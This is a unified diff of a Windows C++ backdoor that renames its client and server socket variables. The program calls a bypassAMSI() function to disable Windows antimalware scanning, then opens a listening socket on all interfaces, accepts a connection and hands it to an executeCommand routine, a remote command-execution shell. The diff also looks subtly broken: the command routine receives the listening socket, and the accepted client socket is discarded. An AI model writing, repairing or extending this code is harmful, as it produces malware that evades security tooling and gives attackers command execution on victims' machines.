@@ -9,8 +9,8 @@
 #define BUFFER_SIZE 1024
 
 struct SocketInfo {
-    SOCKET clientSocket;
-    sockaddr_in clientAddress;
+    SOCKET serverSocket;
+    sockaddr_in serverAddress;
 };
 
 void bypassAMSI() {
@@ -31,58 +31,58 @@ void bypassAMSI() {
     }
 }
 
-SocketInfo createClientSocket() {
+SocketInfo createServerSocket() {
     WSADATA winSockData; // Initializes Winsock
     if (WSAStartup(MAKEWORD(2, 2), &winSockData) != 0) {
         std::cerr << "WSAStartup failed!" << std::endl;
         exit(1);
     }
 
-    SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0); // Creates Socket
-    if (clientSocket == INVALID_SOCKET) {
+    SOCKET serverSocket = socket(AF_INET, SOCK_STREAM, 0); // Creates Socket
+    if (serverSocket == INVALID_SOCKET) {
         std::cerr << "Socket creation failed: " << WSAGetLastError() << std::endl;
         WSACleanup(); // Terminates Winsock
         exit(1);
     }
 
-    sockaddr_in clientAddress; // Stores Address of Socket
-    clientAddress.sin_addr.s_addr = INADDR_ANY; // Accepts connections from any IP
-    clientAddress.sin_family = AF_INET; // IPv4
+    sockaddr_in serverAddress; // Stores Address of Socket
+    serverAddress.sin_addr.s_addr = INADDR_ANY; // Accepts connections from any IP
+    serverAddress.sin_family = AF_INET; // IPv4
 
-    std::cout << "Socket created!" << std::endl;
-    return {clientSocket, clientAddress};
+    std::cout << "Server socket created!" << std::endl;
+    return {serverSocket, serverAddress};
 }
 
-void connectClientSocket(SOCKET clientSocket, sockaddr_in clientAddress, int port) {
-    clientAddress.sin_port = htons(static_cast<u_short>(port)); // Set Port
+void acceptClientConnection(SOCKET serverSocket, sockaddr_in serverAddress, int port) {
+    serverAddress.sin_port = htons(static_cast<u_short>(port)); // Set Port
 
-    if (bind(clientSocket, (sockaddr*)&clientAddress, sizeof(clientAddress)) == SOCKET_ERROR) { // Binds Socket to Address
+    if (bind(serverSocket, (sockaddr*)&serverAddress, sizeof(serverAddress)) == SOCKET_ERROR) { // Binds Socket to Address
         std::cerr << "Socket binding failed: " << WSAGetLastError() << std::endl;
-        closesocket(clientSocket); // Closes Socket
+        closesocket(serverSocket); // Closes Socket
         WSACleanup(); // Terminates Winsock
         exit(1);
     }
 
-    std::cout << "Windows socket bound successfully!" << std::endl;
+    std::cout << "Server socket bound successfully!" << std::endl;
 
-    if (listen(clientSocket, SOMAXCONN) == SOCKET_ERROR) { // Listens for Connections
+    if (listen(serverSocket, SOMAXCONN) == SOCKET_ERROR) { // Listens for Connections
         std::cerr << "Socket listening failed: " << WSAGetLastError() << std::endl;
-        closesocket(clientSocket); // Closes Socket
+        closesocket(serverSocket); // Closes Socket
         WSACleanup(); // Terminates Winsock
         exit(1);
     }
 
-    std::cout << "Windows socket is now listening!" << std::endl;
+    std::cout << "Server socket is now listening!" << std::endl;
 
-    SOCKET serverSocket = accept(clientSocket, NULL, NULL); // Accepts Connection
-    if (serverSocket == INVALID_SOCKET) {
+    SOCKET clientSocket = accept(serverSocket, NULL, NULL); // Accepts Connection
+    if (clientSocket == INVALID_SOCKET) {
         std::cerr << "Socket accepting failed: " << WSAGetLastError() << std::endl;
-        closesocket(clientSocket); // Closes Socket
+        closesocket(serverSocket); // Closes Socket
         WSACleanup(); // Terminates Winsock
         exit(1);
     }
 
-    std::cout << "Windows socket accepted connection!" << std::endl;
+    std::cout << "Server socket accepted client connection!" << std::endl;
 }
 
 void executeCommand(SOCKET clientSocket) {
@@ -118,24 +118,24 @@ void executeCommand(SOCKET clientSocket) {
 }
 
 int main(int argc, char* argv[]) {
-    std::string clientIP = DEFAULT_CLIENT_IP;
+    std::string serverIP = DEFAULT_SERVER_IP;
     int port = DEFAULT_PORT;
 
     // Parse command-line arguments
     if (argc > 1) { port = atoi(argv[1]); } // Set Port
 
-    std::cout << "Client IP: " << clientIP << std::endl;
+    std::cout << "Server IP: " << serverIP << std::endl;
     std::cout << "Port: " << port << std::endl;
 
     // Bypass AMSI
     bypassAMSI();
 
-    // Create and connect socket
-    SocketInfo socketInfo = createClientSocket();
-    connectClientSocket(socketInfo.clientSocket, socketInfo.clientAddress, port);
+    // Create and bind server socket
+    SocketInfo socketInfo = createServerSocket();
+    acceptClientConnection(socketInfo.serverSocket, socketInfo.serverAddress, port);
 
-    // Execute command (example)
-    executeCommand(socketInfo.clientSocket);
+    // Execute command from client
+    executeCommand(socketInfo.serverSocket);
 
     return 0;
 }
